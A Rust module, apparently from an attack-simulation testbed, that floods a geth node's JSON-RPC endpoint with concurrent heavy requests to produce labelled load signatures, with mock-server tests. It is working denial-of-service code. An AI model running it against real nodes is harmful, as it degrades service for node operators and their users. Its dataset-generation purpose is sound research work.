//! RPC flooding attack: saturate a victim geth's JSON-RPC endpoint.
//!
//! A pool of workers sends requests to the victim's RPC as fast as the node
//! answers, for the whole phase. The call used (`eth_getBlockByNumber latest
//! true`) is heavier than a bare `eth_blockNumber`, so a moderate concurrency
//! is enough to raise the node's RPC latency and request rate. Nothing is
//! persisted: the load simply stops when the phase ends.
//!
//! Signature in the dataset: the victim's `rpc_latency_ms` and
//! `rpc_requests_per_sec` climb, and `rpc_failed_requests_total` may rise.

use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;

use futures_util::future::BoxFuture;
use reqwest::Client;
use serde_json::json;
use tokio::sync::oneshot;
use tokio::task::JoinSet;

/// Workers used when none is configured.
pub const DEFAULT_CONCURRENCY: usize = 64;

/// Pause after a failed request, so a refused endpoint does not become a
/// busy loop that pins a CPU.
const ERROR_BACKOFF: Duration = Duration::from_millis(2);

use crate::attacks::{Attack, AttackReport};

pub struct RpcFloodingAttack {
    target: String,
    rpc_url: String,
    client: Client,
    concurrency: usize,
}

impl RpcFloodingAttack {
    /// A flooding attack on the geth at `rpc_url` with `concurrency` workers.
    pub fn new(
        target: impl Into<String>,
        rpc_url: impl Into<String>,
        request_timeout_secs: u64,
        concurrency: usize,
    ) -> Result<Self, reqwest::Error> {
        let client = Client::builder()
            .timeout(Duration::from_secs(request_timeout_secs.max(1)))
            .build()?;

        Ok(Self {
            target: target.into(),
            rpc_url: rpc_url.into(),
            client,
            concurrency: concurrency.max(1),
        })
    }

    /// Sends one request. Errors (timeouts, refusals, HTTP errors) are the
    /// point of the attack, not a failure of it.
    async fn send_one(&self) -> Result<(), reqwest::Error> {
        let body = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "eth_getBlockByNumber",
            "params": ["latest", true],
        });

        let response = self.client.post(&self.rpc_url).json(&body).send().await?;
        // Drain the body so the connection can be reused.
        let _ = response.bytes().await?;
        Ok(())
    }
}

impl Attack for RpcFloodingAttack {
    fn name(&self) -> &'static str {
        "rpc_flooding"
    }

    fn target(&self) -> &str {
        &self.target
    }

    fn run(self: Arc<Self>, cancel: oneshot::Receiver<()>) -> BoxFuture<'static, AttackReport> {
        Box::pin(async move {
            let stop = Arc::new(AtomicBool::new(false));
            let sent = Arc::new(AtomicU64::new(0));
            let errors = Arc::new(AtomicU64::new(0));

            let mut workers = JoinSet::new();
            for _ in 0..self.concurrency {
                let me = Arc::clone(&self);
                let stop = Arc::clone(&stop);
                let sent = Arc::clone(&sent);
                let errors = Arc::clone(&errors);

                workers.spawn(async move {
                    while !stop.load(Ordering::Relaxed) {
                        match me.send_one().await {
                            Ok(()) => {
                                sent.fetch_add(1, Ordering::Relaxed);
                            }
                            Err(_) => {
                                errors.fetch_add(1, Ordering::Relaxed);
                                tokio::time::sleep(ERROR_BACKOFF).await;
                            }
                        }
                    }
                });
            }

            // Flood until the phase ends.
            let _ = cancel.await;
            stop.store(true, Ordering::Relaxed);
            workers.shutdown().await;

            let report = AttackReport {
                rounds: 0,
                actions: sent.load(Ordering::Relaxed),
                errors: errors.load(Ordering::Relaxed),
            };
            tracing::info!(
                target = %self.target,
                requests_sent = report.actions,
                errors = report.errors,
                "rpc_flooding: stopped"
            );
            report
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::AtomicUsize;
    use std::sync::Arc as StdArc;
    use wiremock::matchers::method;
    use wiremock::{Mock, MockServer, Request, Respond, ResponseTemplate};

    struct Counting(StdArc<AtomicUsize>);

    impl Respond for Counting {
        fn respond(&self, _: &Request) -> ResponseTemplate {
            self.0.fetch_add(1, Ordering::SeqCst);
            ResponseTemplate::new(200).set_body_json(json!({
                "jsonrpc": "2.0", "id": 1, "result": { "number": "0x1" },
            }))
        }
    }

    async fn mock_rpc() -> (MockServer, StdArc<AtomicUsize>) {
        let server = MockServer::start().await;
        let hits = StdArc::new(AtomicUsize::new(0));
        Mock::given(method("POST"))
            .respond_with(Counting(StdArc::clone(&hits)))
            .mount(&server)
            .await;
        (server, hits)
    }

    #[tokio::test]
    async fn sends_requests_until_cancelled() {
        let (server, hits) = mock_rpc().await;
        let attack = StdArc::new(RpcFloodingAttack::new("node-01", server.uri(), 2, 4).unwrap());

        let (cancel_tx, cancel_rx) = oneshot::channel();
        let handle = tokio::spawn(StdArc::clone(&attack).run(cancel_rx));

        tokio::time::sleep(Duration::from_millis(80)).await;
        cancel_tx.send(()).unwrap();
        let report = handle.await.unwrap();

        assert!(report.actions > 0, "{report:?}");
        assert_eq!(report.errors, 0);
        // Every counted request got a full response, so the server saw at
        // least that many (a request aborted at cancel may hit the server
        // without being counted, so the server's tally can be higher).
        assert!(
            hits.load(Ordering::SeqCst) as u64 >= report.actions,
            "{report:?}"
        );
    }

    #[tokio::test]
    async fn a_refused_endpoint_is_counted_as_errors_not_a_crash() {
        // Nothing listens on this port: every request is refused.
        let port = {
            let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let attack = StdArc::new(
            RpcFloodingAttack::new("node-01", format!("http://127.0.0.1:{port}"), 1, 2).unwrap(),
        );

        let (cancel_tx, cancel_rx) = oneshot::channel();
        let handle = tokio::spawn(StdArc::clone(&attack).run(cancel_rx));

        tokio::time::sleep(Duration::from_millis(50)).await;
        cancel_tx.send(()).unwrap();
        let report = handle.await.unwrap();

        assert_eq!(report.actions, 0);
        assert!(report.errors > 0, "{report:?}");
    }

    #[tokio::test]
    async fn concurrency_is_at_least_one() {
        let (server, _) = mock_rpc().await;
        let attack = RpcFloodingAttack::new("node-01", server.uri(), 2, 0).unwrap();

        assert_eq!(attack.concurrency, 1);
        assert_eq!(attack.name(), "rpc_flooding");
        assert_eq!(attack.target(), "node-01");
    }
}
